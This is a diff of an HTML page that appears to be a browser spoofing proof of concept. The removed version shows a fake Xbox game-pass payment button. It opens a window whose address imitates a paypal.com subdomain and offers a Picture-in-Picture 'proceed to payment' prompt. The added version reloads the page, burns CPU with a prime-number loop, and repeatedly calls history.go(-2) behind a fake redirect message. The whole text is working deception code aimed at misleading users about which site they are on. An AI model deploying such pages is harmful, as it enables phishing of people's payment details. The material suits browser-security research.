@@ -1,10 +1,42 @@
-<h1>Buy Xbox game passes</h1>
-<button id="pipButton">Make payment.</button>
+ <script>
+    //// MDN calculatePrimes slowdown code
+    function calculatePrimes(iterations, multiplier) {
+        var primes = [];
+        for (var i = 0; i < iterations; i++) {
+            var candidate = i * (multiplier * Math.random());
+            var isPrime = true;
+            for (var c = 2; c <= Math.sqrt(candidate); ++c) {
+                if (candidate % c === 0) {
+                    // not prime
+                    isPrime = false;
+                    break;
+                }
+            }
+            if (isPrime) {
+                primes.push(candidate);
+            }
+        }
+        return primes;
+    }
+
+
+    function main() {
+        location.reload()
+        calculatePrimes(1000, 100000)
+        window.queueMicrotask(spoof)
+    }
+
+    function spoof() {
+        document.getElementById("image").src = null
+
+        setInterval(function () {
+            window.history.go(-2)
+        }, 9)
+    }
+</script>
+Please wait while we redirecting you...
+<img id="image" src="" style="font-family: 'Roboto'; opacity: 0%">
 
 <script>
-pipButton.addEventListener("click", async () => {
-  const player = document.querySelector("#player");
-  const w = window.open("about:blank#very-super-duper-long-subdomain.paypal.com") 
-  w.document.write("<button onclick='documentPictureInPicture.requestWindow()'>Click to proceed to payment</button>")
-});
+    main()
 </script>
